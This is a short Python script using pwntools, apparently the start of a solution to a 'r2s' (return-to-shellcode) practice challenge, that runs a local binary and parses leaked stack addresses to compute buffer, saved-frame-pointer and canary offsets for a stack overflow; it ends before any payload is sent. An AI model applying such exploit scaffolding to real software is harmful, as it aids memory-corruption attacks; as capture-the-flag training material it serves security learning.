from pwn import *
def slog(n, m): return success(": ".join([n, hex(m)]))

p = process("./r2s")
context.arch = "amd64"

# [1] Get information about buf
p.recvuntil("buf: ")
buf = int(p.recvline()[:-1], 16)
slog("Address of buf", buf)
p.recvuntil("$rbp: ")
buf2sfp = int(p.recvline().split()[0])
buf2cnry = buf2sfp - 8
slog("buf <=> sfp", buf2sfp)
slog("buf <=> canary", buf2cnry)
